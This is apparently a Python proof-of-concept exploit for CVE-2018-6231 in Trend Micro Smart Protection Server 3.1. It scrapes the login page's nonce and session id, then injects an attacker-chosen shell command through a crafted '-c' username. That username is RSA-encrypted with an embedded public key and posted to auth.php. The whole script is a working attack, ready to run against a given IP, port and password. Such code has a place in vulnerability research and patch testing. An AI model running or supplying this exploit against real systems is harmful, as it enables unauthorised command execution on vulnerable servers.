"""
Target: Trend Micro Smart Protection Server
Version: 3.1 prior to CP1064
Vulnerability: CVE-2018-6231/ZDI-18-218
Python Version: 3.7
Usage: poc.py $ip $port $command $password
"""

import rsa # pip install rsa
import requests # pip install requests
import re
import sys
import base64
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

N = int("B04A7A09667D53337ADDD976898D317C9B213\
564D795D8B974D5C6E0B69E0FD14C00474C14DD3824D2A5C55D33399B8B9\
D5DCC15E7C2879A388D2C3768D18BD1639463FD00472AE1DC894CBB552F4\
A7126794707BE63497C6A4554A78EB6DED53E42B5408224420BA773A86B5\
73A6D0B9D618B95AAA395703C62561BC01B3062A05D42662F89A66B8991B\
659FD6047A67073013E80F15CC50A8AA9B28E36946ABF980ACC65CE77DDE\
F5EA3A902B0F4AAC5B2F8C6A2CA60EC0129055768BC45B2B8D4A0C2B6766\
54ACD6A1B3074CFAB618680BDEAE4D0E5ED2C8011EA797D3BC237C5A5494\
617C8CF5ACB3B49A4CE0FC8947CF95B63506F7FC0A2F2A899C7E2810C99A\
5A8B18F9FC1BBBA5864A7832C157484C6A6C0CACE23952FD08EBD269066C\
55F5C96BECC95419742CECF0B4062F89413DDC4A74F7F4E5A1ABAB1B6692\
8D8613BBAE622BB189014929222962BC765778AEF47790B735FDEF4E6E99\
7D48D8D6274C3C06184BDBFE3844577A6A38886D76190EC236291917DE5C\
D0C46C63967F6D303B81F37D125E1C35DD4DEDF48A96BBFFFF0BB5009094\
DC801185F229EEE54980D4F822A673B5891D51FE7F5043B117875246E117\
46A640076CDDF7001E222978C4CB7A3D3D23C93405188A053DBBD91DA895\
5A961638C62D0872EE4F22D9D8CE0155C33CA56F0482A0B4B0935A95CDD1\
C75EEB9B2788E564BBE7E3E294B", 16)
e = int("10001", 16)

if __name__ == "__main__":
    _, ip, port, cmd, pwd = sys.argv
    url = "https://%s:%s/" % (ip, port)

    s = requests.session()
    r = s.get(url, verify=False)

    # extract nonce and sid value
    nonce = re.findall(r'name="nonce" value="([^"]+)"', r.text)[0]
    sid = re.findall(r'name="sid" value="([^"]+)"', r.text)[0]
    
    # encrypt, encode, and POST
    user = "-c %s" % cmd
    data = "%s\t%s\t%s" % (user, pwd, nonce)
    key = rsa.PublicKey(N, e)
    data = rsa.encrypt(str.encode(data), key)
    data = base64.b64encode(data)
    r = s.post(url + "auth.php", data={'data': data, 'sid': sid})